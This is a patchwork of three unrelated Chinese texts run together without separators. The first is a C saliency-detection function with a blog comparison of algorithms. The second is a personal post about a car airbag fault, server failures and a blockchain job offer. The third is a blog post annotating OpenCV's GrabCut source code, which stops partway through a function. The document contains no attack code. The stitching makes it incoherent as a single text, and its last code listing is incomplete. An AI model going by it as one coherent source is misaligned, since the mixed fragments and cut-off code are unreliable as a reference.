/// 实现功能： 基于Frequency-tuned 的图像显著性检测
///    参考论文： Frequency-tuned Salient Region Detection， Radhakrishna Achantay， Page 4-5, 2009 CVPR 
///               http://ivrgwww.epfl.ch/supplementary_material/RK_CVPR09/
///    整理时间： 2014.8.2
/// </summary>
/// <param name="Src">需要进行检测的图像数据，只支持24位图像。</param>
/// <param name="SaliencyMap">输出的显著性图像，也是24位的。</param>
/// <param name="Width">输入的彩色数据的对应的灰度数据。</param>
/// <param name="Height">输入图像数据的高度。</param>
/// <param name="Stride">图像的扫描行大小。</param>
///    <remarks> 在Lab空间进行的处理，但是不能用库中的整形RGBLAB颜色函数，必须用原始的浮点数处理。不然很多结果不明显，原因未知。</remarks>

void __stdcall SalientRegionDetectionBasedOnFT(unsigned char *Src, unsigned char *SaliencyMap, int Width, int Height, int Stride)
{
    int X, Y, XX, YY, Index, Fast, CurIndex, SrcB, SrcG, SrcR, DstB, DstG, DstR;
    float *Lab = (float *) malloc(Height * Stride * sizeof(float));
    float *DistMap = (float *) malloc(Height * Width * sizeof(float));
    float MeanL = 0, MeanA = 0, MeanB = 0;
    
    for (Y = 0; Y < Height; Y++) 
        RGBToLABF(Src + Y * Stride, Lab + Y * Stride, Width);                //    浮点类型的数据转换
    
    for (Y = 0; Y < Height; Y++) 
    {
        Index = Y * Stride;
        for (X = 0; X < Width; X++)
        {
            MeanL +=  Lab[Index];
            MeanA +=  Lab[Index + 1];
            MeanB +=  Lab[Index + 2];
            Index += 3;
        }
    }
    MeanL /= (Width * Height);                                            //    求LAB空间的平均值
    MeanA /= (Width * Height);
    MeanB /= (Width * Height);

    GuassBlurF(Lab, Width, Height, Stride, 1);                            //    use Gaussian blur to eliminate ﬁne texture details as well as noise and coding artifacts

    for (Y = 0; Y < Height; Y++)                                        //    网站的matlab代码的blur部分代码不对
    {
        Index = Y * Stride;
        CurIndex = Y * Width;
        for (X = 0; X < Width; X++)                                        //    计算像素的显著性
        {
            DistMap[CurIndex++] = (MeanL - Lab[Index]) *  (MeanL - Lab[Index]) +  (MeanA - Lab[Index + 1]) *  (MeanA - Lab[Index + 1]) +  (MeanB - Lab[Index + 2]) *  (MeanB - Lab[Index + 2])   ;
            Index += 3;
        }
    }
    
    Normalize(DistMap, SaliencyMap, Width, Height, Stride);                //    归一化图像数据

    free(Lab);
    free(DistMap);

}
    检测效果如下图:






五、四种算法的综合比较
通过一些试验图像，我到时觉得4种算法，FT的效果最为明显，举例如下：





原图   FT(50ms) AC(25ms)



LC(2ms) AC(23ms) 
只有FT检测出了那个叶。





原图            FT         AC 



LC AC
六、下一步工作
这里我研究的几种显著性分析都是很简单很基础的算法，实现起来也比较方便，现在还有很多效果显著但是算法比较复杂的论文，等有空或者有能力的是在去看看他们。在这显著性分析只是很多其他处理的第一步，有了这个基础，我也想看看后续的分割或者再感知缩放方面的应用吧。
http://files.cnblogs.com/Imageshop/salientregiondetection.rar

做了一个测试集。
****************************基本上我不提供源代码，但是我会尽量用文字把对应的算法描述清楚或提供参考文档************************
*************************************因为靠自己的努力和实践写出来的效果才真正是自己的东西，人一定要靠自己*******************
****************************作者： laviewpbt   时间： 2014.8.4    联系QQ:  33184777 转载请保留本行信息**********************









 border="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=22763956&auto=1&height=66">
最近挺好玩的，我碰到了一些，由于细节问题而造成浪费时间的事情，我的汽车安全气囊灯突然亮了， 
￼ 
我找到四s店，维修小哥漫不经心地帮我加了一根延长线，灯就此灭了，我问他咋了，他爱理不理的？给我说是调整座椅的时候，可能把线扯松了，或者扯断了，我对他的态度不以为然，也不想太搭理他，就开车走了，也没有检查什么，我想当时应该花点时间把座椅调整调整，前后挪挪检查检查，结果车开了没半天，安全气囊的报警灯又亮了。

这次我心里就有火，开着车就去了四s店，在店里又检测了一次，服务人员说，可能全车身的安全气囊线得全换，但是现在是年前厂家已经不发货了，得年后，这不影响驾驶，我听了，非常火大，跟他理论了半天，我说如果车开着安全气囊突然蹦出来，谁来负责？
销售人员也一时语塞我看他非常窘迫，也懒得和他理论就开着车又走了，我想，如果上次我多花一两分钟时间，仔细把车检查检查就可能在年前把这事了了，也不至于浪费这么长时间。
后来这两天要婚检，照结婚证件照，都是提前没有完全了解清楚情况，带的东西是驴唇不对马嘴，来回跑了很多次。 
还好，只要思想不滑坡，办法总比困难多！生活一直还在慢慢进行。

目瞪口呆的bug
当天晚些时候我在，《床上等你砖家群》里面聊天提到了运维集群的事情，专家们分享了千奇百怪的机房故障和服务器故障，让我大开眼界， 
￼

 
￼ 
 
现在是大数据的时代，随着时间的推移数据量的规模会越来越大，各种政府机关私有云的规模，其数据量的规模呈几何级数增长，当然，你懂得这些机房中斯搭乱建的现象，普遍存在。 
一旦有人开始负责这些项目，我认为如果不花大力气在每个细小的环节上精准把控，那么运维人员将面临一个非常危险的境地，假如系统问题恰巧发生在关键环节造成关键数据丢失，比如代码服务器git，集群的namenode，数据库。而你恰好没用ha，没有备份。那么…
加班吧，宝贝！

疯狂的币圈
朋友圈先驱者今年都在看区块链技术，老王也不甘寂寞。今年年底的时候有个做区块链的公司给我打电话，直接面试我。
问我，你知道比特币那些矿机成天开着都在算什么么？
我说类似解方程吧。他说不完全对，以下省略2万字，听完我说好，你准备给我开多少钱。 
对方说，开多少钱不是问题，币圈这东西是全球一小撮最聪明的人在做。我给你开工资，如果你是为了简单的挣钱，挣这点工资，那我劝你还是别来了，咱们干这个你如果没有激情没有钻研精神那和普通程序员有什么区别。
我说不会的，每天叫醒我的不是闹钟是梦想。 
他说，我们公司有两种支付方式，币，和人民币，你选那个？ 
我说人民币。 
第二天我就收到了一个没有报道期限的offer，上网查了一下，这个公司规模还真不小，一时间有点恍惚。
后来有幸读到下面这个文章，分享给 大家 
https://mp.weixin.qq.com/s/I1rNYDy6Lw0SUyVbu_JaKA


马上过情人节了，祝大家春节快乐
2018年过去两个多月，前些天还很冷，最近却阳光炫目， 
弄的人有点恍惚。
我很喜欢文章的配乐，中文名叫《唯独你是不可取替》，乐队代表作品：《好想大声说爱你》，我单曲循环这首歌，好像回到了过去，早上打球，下午游泳，晚上ktv浑然不觉的日子， 
弄的人有点恍惚。
马上过春节了，情人节也到了，马上领证结婚， 
弄的人有点恍惚。
责任越来越大，一点也不能恍惚
再次祝福老王和他的IT界朋友们， 
新春快乐，一帆风顺、二龙腾飞、三羊开泰、四季平安、五福临门、六六大 顺、七星高照、八方来财、九九同心、十全十美、百事亨通、千事吉祥、万事如意！ 






    
图像分割之（四）OpenCV的GrabCut函数使用和源码解读            

        分类：            图像处理            计算机视觉            
2013-01-23 17:19     
12031人阅读     评论(33)    收藏    举报    

图像分割之（四）OpenCV的GrabCut函数使用和源码解读
zouxy09@qq.com
http://blog.csdn.net/zouxy09
 
      上一文对GrabCut做了一个了解。OpenCV中的GrabCut算法是依据《"GrabCut" - Interactive
 Foreground Extraction using Iterated Graph Cuts》这篇文章来实现的。现在我对源码做了些注释，以便我们更深入的了解该算法。一直觉得论文和代码是有比较大的差别的，个人觉得脱离代码看论文，最多能看懂70%，剩下20%或者更多就需要通过阅读代码来获得了，那还有10%就和每个人的基础和知识储备相挂钩了。
      接触时间有限，若有错误，还望各位前辈指正，谢谢。原论文的一些浅解见上一博文：
          
http://blog.csdn.net/zouxy09/article/details/8534954
 
一、GrabCut函数使用
      在OpenCV的源码目录的samples的文件夹下，有grabCut的使用例程，请参考：
opencv\samples\cpp\grabcut.cpp。
而grabCut函数的API说明如下：
void cv::grabCut( InputArray _img, InputOutputArray _mask, Rect rect,
                  InputOutputArray _bgdModel, InputOutputArray _fgdModel,
                  int iterCount, int mode )
/*
****参数说明：
         img——待分割的源图像，必须是8位3通道（CV_8UC3）图像，在处理的过程中不会被修改；
         mask——掩码图像，如果使用掩码进行初始化，那么mask保存初始化掩码信息；在执行分割的时候，也可以将用户交互所设定的前景与背景保存到mask中，然后再传入grabCut函数；在处理结束之后，mask中会保存结果。mask只能取以下四种值：
                   GCD_BGD（=0），背景；
                   GCD_FGD（=1），前景；
                   GCD_PR_BGD（=2），可能的背景；
                   GCD_PR_FGD（=3），可能的前景。
                  如果没有手工标记GCD_BGD或者GCD_FGD，那么结果只会有GCD_PR_BGD或GCD_PR_FGD；
         rect——用于限定需要进行分割的图像范围，只有该矩形窗口内的图像部分才被处理；
         bgdModel——背景模型，如果为null，函数内部会自动创建一个bgdModel；bgdModel必须是单通道浮点型（CV_32FC1）图像，且行数只能为1，列数只能为13x5；
         fgdModel——前景模型，如果为null，函数内部会自动创建一个fgdModel；fgdModel必须是单通道浮点型（CV_32FC1）图像，且行数只能为1，列数只能为13x5；
         iterCount——迭代次数，必须大于0；
         mode——用于指示grabCut函数进行什么操作，可选的值有：
                   GC_INIT_WITH_RECT（=0），用矩形窗初始化GrabCut；
                   GC_INIT_WITH_MASK（=1），用掩码图像初始化GrabCut；
                   GC_EVAL（=2），执行分割。
*/
 
二、GrabCut源码解读
       其中源码包含了gcgraph.hpp这个构建图和max flow/min cut算法的实现文件，这个文件暂时没有解读，后面再更新了。
/*M///////////////////////////////////////////////////////////////////////////////////////
//
//  IMPORTANT: READ BEFORE DOWNLOADING, COPYING, INSTALLING OR USING.
//
//  By downloading, copying, installing or using the software you agree to this license.
//  If you do not agree to this license, do not download, install,
//  copy or use the software.
//
//
//                        Intel License Agreement
//                For Open Source Computer Vision Library
//
// Copyright (C) 2000, Intel Corporation, all rights reserved.
// Third party copyrights are property of their respective owners.
//
// Redistribution and use in source and binary forms, with or without modification,
// are permitted provided that the following conditions are met:
//
//   * Redistribution's of source code must retain the above copyright notice,
//     this list of conditions and the following disclaimer.
//
//   * Redistribution's in binary form must reproduce the above copyright notice,
//     this list of conditions and the following disclaimer in the documentation
//     and/or other materials provided with the distribution.
//
//   * The name of Intel Corporation may not be used to endorse or promote products
//     derived from this software without specific prior written permission.
//
// This software is provided by the copyright holders and contributors "as is" and
// any express or implied warranties, including, but not limited to, the implied
// warranties of merchantability and fitness for a particular purpose are disclaimed.
// In no event shall the Intel Corporation or contributors be liable for any direct,
// indirect, incidental, special, exemplary, or consequential damages
// (including, but not limited to, procurement of substitute goods or services;
// loss of use, data, or profits; or business interruption) however caused
// and on any theory of liability, whether in contract, strict liability,
// or tort (including negligence or otherwise) arising in any way out of
// the use of this software, even if advised of the possibility of such damage.
//
//M*/

#include "precomp.hpp"
#include "gcgraph.hpp"
#include <limits>

using namespace cv;

/*
This is implementation of image segmentation algorithm GrabCut described in
"GrabCut — Interactive Foreground Extraction using Iterated Graph Cuts".
Carsten Rother, Vladimir Kolmogorov, Andrew Blake.
 */

/*
 GMM - Gaussian Mixture Model
*/
class GMM
{
public:
    static const int componentsCount = 5;

    GMM( Mat& _model );
    double operator()( const Vec3d color ) const;
    double operator()( int ci, const Vec3d color ) const;
    int whichComponent( const Vec3d color ) const;

    void initLearning();
    void addSample( int ci, const Vec3d color );
    void endLearning();

private:
    void calcInverseCovAndDeterm( int ci );
    Mat model;
    double* coefs;
    double* mean;
    double* cov;

    double inverseCovs[componentsCount][3][3]; //协方差的逆矩阵
    double covDeterms[componentsCount];  //协方差的行列式

    double sums[componentsCount][3];
    double prods[componentsCount][3][3];
    int sampleCounts[componentsCount];
    int totalSampleCount;
};

//背景和前景各有一个对应的GMM（混合高斯模型）
GMM::GMM( Mat& _model )
{
	//一个像素的（唯一对应）高斯模型的参数个数或者说一个高斯模型的参数个数
	//一个像素RGB三个通道值，故3个均值，3*3个协方差，共用一个权值
    const int modelSize = 3/*mean*/ + 9/*covariance*/ + 1/*component weight*/;
    if( _model.empty() )
    {
		//一个GMM共有componentsCount个高斯模型，一个高斯模型有modelSize个模型参数
        _model.create( 1, modelSize*componentsCount, CV_64FC1 );
        _model.setTo(Scalar(0));
    }
    else if( (_model.type() != CV_64FC1) || (_model.rows != 1) || (_model.cols != modelSize*componentsCount) )
        CV_Error( CV_StsBadArg, "_model must have CV_64FC1 type, rows == 1 and cols == 13*componentsCount" );

    model = _model;

	//注意这些模型参数的存储方式：先排完componentsCount个coefs，再3*componentsCount个mean。
	//再3*3*componentsCount个cov。
    coefs = model.ptr<double>(0);  //GMM的每个像素的高斯模型的权值变量起始存储指针
    mean = coefs + componentsCount; //均值变量起始存储指针
    cov = mean + 3*componentsCount;  //协方差变量起始存储指针

    for( int ci = 0; ci < componentsCount; ci++ )
        if( coefs[ci] > 0 )
			 //计算GMM中第ci个高斯模型的协方差的逆Inverse和行列式Determinant
			 //为了后面计算每个像素属于该高斯模型的概率（也就是数据能量项）
             calcInverseCovAndDeterm( ci ); 
}

//计算一个像素（由color=（B,G,R）三维double型向量来表示）属于这个GMM混合高斯模型的概率。
//也就是把这个像素像素属于componentsCount个高斯模型的概率与对应的权值相乘再相加，
//具体见论文的公式（10）。结果从res返回。
//这个相当于计算Gibbs能量的第一个能量项（取负后）。
double GMM::operator()( const Vec3d color ) const
{
    double res = 0;
    for( int ci = 0; ci < componentsCount; ci++ )
        res += coefs[ci] * (*this)(ci, color );
    return res;
}

//计算一个像素（由color=（B,G,R）三维double型向量来表示）属于第ci个高斯模型的概率。
//具体过程，即高阶的高斯密度模型计算式，具体见论文的公式（10）。结果从res返回
double GMM::operator()( int ci, const Vec3d color ) const
{
    double res = 0;
    if( coefs[ci] > 0 )
    {
        CV_Assert( covDeterms[ci] > std::numeric_limits<double>::epsilon() );
        Vec3d diff = color;
        double* m = mean + 3*ci;
        diff[0] -= m[0]; diff[1] -= m[1]; diff[2] -= m[2];
        double mult = diff[0]*(diff[0]*inverseCovs[ci][0][0] + diff[1]*inverseCovs[ci][1][0] + diff[2]*inverseCovs[ci][2][0])
                   + diff[1]*(diff[0]*inverseCovs[ci][0][1] + diff[1]*inverseCovs[ci][1][1] + diff[2]*inverseCovs[ci][2][1])
                   + diff[2]*(diff[0]*inverseCovs[ci][0][2] + diff[1]*inverseCovs[ci][1][2] + diff[2]*inverseCovs[ci][2][2]);
        res = 1.0f/sqrt(covDeterms[ci]) * exp(-0.5f*mult);
    }
    return res;
}

//返回这个像素最有可能属于GMM中的哪个高斯模型（概率最大的那个）
int GMM::whichComponent( const Vec3d color ) const
{
    int k = 0;
    double max = 0;

    for( int ci = 0; ci < componentsCount; ci++ )
    {
        double p = (*this)( ci, color );
        if( p > max )
        {
            k = ci;  //找到概率最大的那个，或者说计算结果最大的那个
            max = p;
        }
    }
    return k;
}

//GMM参数学习前的初始化，主要是对要求和的变量置零
void GMM::initLearning()
{
    for( int ci = 0; ci < componentsCount; ci++)
    {
        sums[ci][0] = sums[ci][1] = sums[ci][2] = 0;
        prods[ci][0][0] = prods[ci][0][1] = prods[ci][0][2] = 0;
        prods[ci][1][0] = prods[ci][1][1] = prods[ci][1][2] = 0;
        prods[ci][2][0] = prods[ci][2][1] = prods[ci][2][2] = 0;
        sampleCounts[ci] = 0;
    }
    totalSampleCount = 0;
}

//增加样本，即为前景或者背景GMM的第ci个高斯模型的像素集（这个像素集是来用估
//计计算这个高斯模型的参数的）增加样本像素。计算加入color这个像素后，像素集
//中所有像素的RGB三个通道的和sums（用来计算均值），还有它的prods（用来计算协方差），
//并且记录这个像素集的像素个数和总的像素个数（用来计算这个高斯模型的权值）。
void GMM::addSample( int ci, const Vec3d color )
{
    sums[ci][0] += color[0]; sums[ci][1] += color[1]; sums[ci][2] += color[2];
    prods[ci][0][0] += color[0]*color[0]; prods[ci][0][1] += color[0]*color[1]; prods[ci][0][2] += color[0]*color[2];
    prods[ci][1][0] += color[1]*color[0]; prods[ci][1][1] += color[1]*color[1]; prods[ci][1][2] += color[1]*color[2];
    prods[ci][2][0] += color[2]*color[0]; prods[ci][2][1] += color[2]*color[1]; prods[ci][2][2] += color[2]*color[2];
    sampleCounts[ci]++;
    totalSampleCount++;
}

//从图像数据中学习GMM的参数：每一个高斯分量的权值、均值和协方差矩阵；
//这里相当于论文中“Iterative minimisation”的step 2
void GMM::endLearning()
{
    const double variance = 0.01;
    for( int ci = 0; ci < componentsCount; ci++ )
    {
        int n = sampleCounts[ci]; //第ci个高斯模型的样本像素个数
        if( n == 0 )
            coefs[ci] = 0;
        else
        {
            //计算第ci个高斯模型的权值系数
			coefs[ci] = (double)n/totalSampleCount; 

            //计算第ci个高斯模型的均值
			double* m = mean + 3*ci;
            m[0] = sums[ci][0]/n; m[1] = sums[ci][1]/n; m[2] = sums[ci][2]/n;

            //计算第ci个高斯模型的协方差
			double* c = cov + 9*ci;
            c[0] = prods[ci][0][0]/n - m[0]*m[0]; c[1] = prods[ci][0][1]/n - m[0]*m[1]; c[2] = prods[ci][0][2]/n - m[0]*m[2];
            c[3] = prods[ci][1][0]/n - m[1]*m[0]; c[4] = prods[ci][1][1]/n - m[1]*m[1]; c[5] = prods[ci][1][2]/n - m[1]*m[2];
            c[6] = prods[ci][2][0]/n - m[2]*m[0]; c[7] = prods[ci][2][1]/n - m[2]*m[1]; c[8] = prods[ci][2][2]/n - m[2]*m[2];

            //计算第ci个高斯模型的协方差的行列式
			double dtrm = c[0]*(c[4]*c[8]-c[5]*c[7]) - c[1]*(c[3]*c[8]-c[5]*c[6]) + c[2]*(c[3]*c[7]-c[4]*c[6]);
            if( dtrm <= std::numeric_limits<double>::epsilon() )
            {
                //相当于如果行列式小于等于0，（对角线元素）增加白噪声，避免其变
				//为退化（降秩）协方差矩阵（不存在逆矩阵，但后面的计算需要计算逆矩阵）。
				// Adds the white noise to avoid singular covariance matrix.
                c[0] += variance;
                c[4] += variance;
                c[8] += variance;
            }
			
			//计算第ci个高斯模型的协方差的逆Inverse和行列式Determinant
            calcInverseCovAndDeterm(ci);
        }
    }
}

//计算协方差的逆Inverse和行列式Determinant
void GMM::calcInverseCovAndDeterm( int ci )
{
    if( coefs[ci] > 0 )
    {
		//取第ci个高斯模型的协方差的起始指针
        double *c = cov + 9*ci;
        double dtrm =
              covDeterms[ci] = c[0]*(c[4]*c[8]-c[5]*c[7]) - c[1]*(c[3]*c[8]-c[5]*c[6]) 
								+ c[2]*(c[3]*c[7]-c[4]*c[6]);

        //在C++中，每一种内置的数据类型都拥有不同的属性, 使用<limits>库可以获
		//得这些基本数据类型的数值属性。因为浮点算法的截断，所以使得，当a=2，
		//b=3时 10*a/b == 20/b不成立。那怎么办呢？
		//这个小正数（epsilon）常量就来了，小正数通常为可用给定数据类型的
		//大于1的最小值与1之差来表示。若dtrm结果不大于小正数，那么它几乎为零。
		//所以下式保证dtrm>0，即行列式的计算正确（协方差对称正定，故行列式大于0）。
		CV_Assert( dtrm > std::numeric_limits<double>::epsilon() );
		//三阶方阵的求逆
        inverseCovs[ci][0][0] =  (c[4]*c[8] - c[5]*c[7]) / dtrm;
        inverseCovs[ci][1][0] = -(c[3]*c[8] - c[5]*c[6]) / dtrm;
        inverseCovs[ci][2][0] =  (c[3]*c[7] - c[4]*c[6]) / dtrm;
        inverseCovs[ci][0][1] = -(c[1]*c[8] - c[2]*c[7]) / dtrm;
        inverseCovs[ci][1][1] =  (c[0]*c[8] - c[2]*c[6]) / dtrm;
        inverseCovs[ci][2][1] = -(c[0]*c[7] - c[1]*c[6]) / dtrm;
        inverseCovs[ci][0][2] =  (c[1]*c[5] - c[2]*c[4]) / dtrm;
        inverseCovs[ci][1][2] = -(c[0]*c[5] - c[2]*c[3]) / dtrm;
        inverseCovs[ci][2][2] =  (c[0]*c[4] - c[1]*c[3]) / dtrm;
    }
}

//计算beta，也就是Gibbs能量项中的第二项（平滑项）中的指数项的beta，用来调整
//高或者低对比度时，两个邻域像素的差别的影响的，例如在低对比度时，两个邻域
//像素的差别可能就会比较小，这时候需要乘以一个较大的beta来放大这个差别，
//在高对比度时，则需要缩小本身就比较大的差别。
//所以我们需要分析整幅图像的对比度来确定参数beta，具体的见论文公式（5）。
/*
  Calculate beta - parameter of GrabCut algorithm.
  beta = 1/(2*avg(sqr(||color[i] - color[j]||)))
*/
static double calcBeta( const Mat& img )
{
    double beta = 0;
    for( int y = 0; y < img.rows; y++ )
    {
        for( int x = 0; x < img.cols; x++ )
        {
			//计算四个方向邻域两像素的差别，也就是欧式距离或者说二阶范数
			//（当所有像素都算完后，就相当于计算八邻域的像素差了）
            Vec3d color = img.at<Vec3b>(y,x);
            if( x>0 ) // left  >0的判断是为了避免在图像边界的时候还计算，导致越界
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y,x-1);
                beta += diff.dot(diff);  //矩阵的点乘，也就是各个元素平方的和
            }
            if( y>0 && x>0 ) // upleft
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x-1);
                beta += diff.dot(diff);
            }
            if( y>0 ) // up
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x);
                beta += diff.dot(diff);
            }
            if( y>0 && x<img.cols-1) // upright
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x+1);
                beta += diff.dot(diff);
            }
        }
    }
    if( beta <= std::numeric_limits<double>::epsilon() )
        beta = 0;
    else
        beta = 1.f / (2 * beta/(4*img.cols*img.rows - 3*img.cols - 3*img.rows + 2) ); //论文公式（5）

    return beta;
}

//计算图每个非端点顶点（也就是每个像素作为图的一个顶点，不包括源点s和汇点t）与邻域顶点
//的边的权值。由于是无向图，我们计算的是八邻域，那么对于一个顶点，我们计算四个方向就行，
//在其他的顶点计算的时候，会把剩余那四个方向的权值计算出来。这样整个图算完后，每个顶点
//与八邻域的顶点的边的权值就都计算出来了。
//这个相当于计算Gibbs能量的第二个能量项（平滑项），具体见论文中公式（4）
/*
  Calculate weights of noterminal vertices of graph.
  beta and gamma - parameters of GrabCut algorithm.
 */
static void calcNWeights( const Mat& img, Mat& leftW, Mat& upleftW, Mat& upW, 
							Mat& uprightW, double beta, double gamma )
{
    //gammaDivSqrt2相当于公式（4）中的gamma * dis(i,j)^(-1)，那么可以知道，
	//当i和j是垂直或者水平关系时，dis(i,j)=1，当是对角关系时，dis(i,j)=sqrt(2.0f)。
	//具体计算时，看下面就明白了
	const double gammaDivSqrt2 = gamma / std::sqrt(2.0f);
	//每个方向的边的权值通过一个和图大小相等的Mat来保存
    leftW.create( img.rows, img.cols, CV_64FC1 );
    upleftW.create( img.rows, img.cols, CV_64FC1 );
    upW.create( img.rows, img.cols, CV_64FC1 );
    uprightW.create( img.rows, img.cols, CV_64FC1 );
    for( int y = 0; y < img.rows; y++ )
    {
        for( int x = 0; x < img.cols; x++ )
        {
            Vec3d color = img.at<Vec3b>(y,x);
            if( x-1>=0 ) // left  //避免图的边界
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y,x-1);
                leftW.at<double>(y,x) = gamma * exp(-beta*diff.dot(diff));
            }
            else
                leftW.at<double>(y,x) = 0;
            if( x-1>=0 && y-1>=0 ) // upleft
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x-1);
                upleftW.at<double>(y,x) = gammaDivSqrt2 * exp(-beta*diff.dot(diff));
            }
            else
                upleftW.at<double>(y,x) = 0;
            if( y-1>=0 ) // up
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x);
                upW.at<double>(y,x) = gamma * exp(-beta*diff.dot(diff));
            }
            else
                upW.at<double>(y,x) = 0;
            if( x+1<img.cols && y-1>=0 ) // upright
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x+1);
                uprightW.at<double>(y,x) = gammaDivSqrt2 * exp(-beta*diff.dot(diff));
            }
            else
                uprightW.at<double>(y,x) = 0;
        }
    }
}

//检查mask的正确性。mask为通过用户交互或者程序设定的，它是和图像大小一样的单通道灰度图，
//每个像素只能取GC_BGD or GC_FGD or GC_PR_BGD or GC_PR_FGD 四种枚举值，分别表示该像素
//（用户或者程序指定）属于背景、前景、可能为背景或者可能为前景像素。具体的参考：
//ICCV2001“Interactive Graph Cuts for Optimal Boundary & Region Segmentation of Objects in N-D Images”
//Yuri Y. Boykov Marie-Pierre Jolly 
/*
  Check size, type and element values of mask matrix.
 */
static void checkMask( const Mat& img, const Mat& mask )
{
    if( mask.empty() )
        CV_Error( CV_StsBadArg, "mask is empty" );
    if( mask.type() != CV_8UC1 )
        CV_Error( CV_StsBadArg, "mask must have CV_8UC1 type" );
    if( mask.cols != img.cols || mask.rows != img.rows )
        CV_Error( CV_StsBadArg, "mask must have as many rows and cols as img" );
    for( int y = 0; y < mask.rows; y++ )
    {
        for( int x = 0; x < mask.cols; x++ )
        {
            uchar val = mask.at<uchar>(y,x);
            if( val!=GC_BGD && val!=GC_FGD && val!=GC_PR_BGD && val!=GC_PR_FGD )
                CV_Error( CV_StsBadArg, "mask element value must be equel"
                    "GC_BGD or GC_FGD or GC_PR_BGD or GC_PR_FGD" );
        }
    }
}

//通过用户框选目标rect来创建mask，rect外的全部作为背景，设置为GC_BGD，
//rect内的设置为 GC_PR_FGD（可能为前景）
/*
  Initialize mask using rectangular.
*/
static void initMaskWithRect( Mat& mask, Size imgSize, Rect rect )
{
    mask.create( imgSize, CV_8UC1 );
    mask.setTo( GC_BGD );

    rect.x = max(0, rect.x);
    rect.y = max(0, rect.y);
    rect.width = min(rect.width, imgSize.width-rect.x);
    rect.height = min(rect.height, imgSize.height-rect.y);

    (mask(rect)).setTo( Scalar(GC_PR_FGD) );
}

//通过k-means算法来初始化背景GMM和前景GMM模型
/*
  Initialize GMM background and foreground models using kmeans algorithm.
*/
static void initGMMs( const Mat& img, const Mat& mask, GMM& bgdGMM, GMM& fgdGMM )
{
    const int kMeansItCount = 10;  //迭代次数
    const int kMeansType = KMEANS_PP_CENTERS; //Use kmeans++ center initialization by Arthur and Vassilvitskii

    Mat bgdLabels, fgdLabels; //记录背景和前景的像素样本集中每个像素对应GMM的哪个高斯模型，论文中的kn
    vector<Vec3f> bgdSamples, fgdSamples; //背景和前景的像素样本集
    Point p;
    for( p.y = 0; p.y < img.rows; p.y++ )
    {
        for( p.x = 0; p.x < img.cols; p.x++ )
        {
            //mask中标记为GC_BGD和GC_PR_BGD的像素都作为背景的样本像素
			if( mask.at<uchar>(p) == GC_BGD || mask.at<uchar>(p) == GC_PR_BGD )
                bgdSamples.push_back( (Vec3f)img.at<Vec3b>(p) );
            else // GC_FGD | GC_PR_FGD
                fgdSamples.push_back( (Vec3f)img.at<Vec3b>(p) );
        }
    }
    CV_Assert( !bgdSamples.empty() && !fgdSamples.empty() );
	
	//kmeans中参数_bgdSamples为：每行一个样本
	//kmeans的输出为bgdLabels，里面保存的是输入样本集中每一个样本对应的类标签（样本聚为componentsCount类后）
    Mat _bgdSamples( (int)bgdSamples.size(), 3, CV_32FC1, &bgdSamples[0][0] );
    kmeans( _bgdSamples, GMM::componentsCount, bgdLabels,
            TermCriteria( CV_TERMCRIT_ITER, kMeansItCount, 0.0), 0, kMeansType );
    Mat _fgdSamples( (int)fgdSamples.size(), 3, CV_32FC1, &fgdSamples[0][0] );
    kmeans( _fgdSamples, GMM::componentsCount, fgdLabels,
            TermCriteria( CV_TERMCRIT_ITER, kMeansItCount, 0.0), 0, kMeansType );

    //经过上面的步骤后，每个像素所属的高斯模型就确定的了，那么就可以估计GMM中每个高斯模型的参数了。
	bgdGMM.initLearning();
    for( int i = 0; i < (int)bgdSamples.size(); i++ )
        bgdGMM.addSample( bgdLabels.at<int>(i,0), bgdSamples[i] );
    bgdGMM.endLearning();

    fgdGMM.initLearning();
    for( int i = 0; i < (int)fgdSamples.size(); i++ )
        fgdGMM.addSample( fgdLabels.at<int>(i,0), fgdSamples[i] );
    fgdGMM.endLearning();
}

//论文中：迭代最小化算法step 1：为每个像素分配GMM中所属的高斯模型，kn保存在Mat compIdxs中
/*
  Assign GMMs components for each pixel.
*/
static void assignGMMsComponents( const Mat& img, const Mat& mask, const GMM& bgdGMM, 
									const GMM& fgdGMM, Mat& compIdxs )
{
    Point p;
    for( p.y = 0; p.y < img.rows; p.y++ )
    {
        for( p.x = 0; p.x < img.cols; p.x++ )
        {
            Vec3d color = img.at<Vec3b>(p);
			//通过mask来判断该像素属于背景像素还是前景像素，再判断它属于前景或者背景GMM中的哪个高斯分量
            compIdxs.at<int>(p) = mask.at<uchar>(p) == GC_BGD || mask.at<uchar>(p) == GC_PR_BGD ?
                bgdGMM.whichComponent(color) : fgdGMM.whichComponent(color);
        }
    }
}

//论文中：迭代最小化算法step 2：从每个高斯模型的像素样本集中学习每个高斯模型的参数
/*
  Learn GMMs parameters.
*/
static void learnGMMs( const Mat& img, const Mat& mask, const Mat& compIdxs, GMM& bgdGMM, GMM& fgdGMM )
{
    bgdGMM.initLearning();
    fgdGMM.initLearning();
    Point p;
    for( int ci = 0; ci < GMM::componentsCount; ci++ )
    {
        for( p.y = 0; p.y < img.rows; p.y++ )
        {
            for( p.x = 0; p.x < img.cols; p.x++ )
            {
                if( compIdxs.at<int>(p) == ci )
                {
                    if( mask.at<uchar>(p) == GC_BGD || mask.at<uchar>(p) == GC_PR_BGD )
                        bgdGMM.addSample( ci, img.at<Vec3b>(p) );
                    else
                        fgdGMM.addSample( ci, img.at<Vec3b>(p) );
                }
            }
        }
    }
    bgdGMM.endLearning();
    fgdGMM.endLearning();
}

//通过计算得到的能量项构建图，图的顶点为像素点，图的边由两部分构成，
//一类边是：每个顶点与Sink汇点t（代表背景）和源点Source（代表前景）连接的边，
//这类边的权值通过Gibbs能量项的第一项能量项来表示。
//另一类边是：每个顶点与其邻域顶点连接的边，这类边的权值通过Gibbs能量项的第二项能量项来表示。
/*
  Construct GCGraph
*/
static void constructGCGraph( const Mat& img, const Mat& mask, const GMM& bgdGMM, const GMM& fgdGMM, double lambda,
                       const Mat& leftW, const Mat& upleftW, const Mat& upW, const Mat& uprightW,
                       GCGraph<double>& graph )
{
    int vtxCount = img.cols*img.rows;  //顶点数，每一个像素是一个顶点
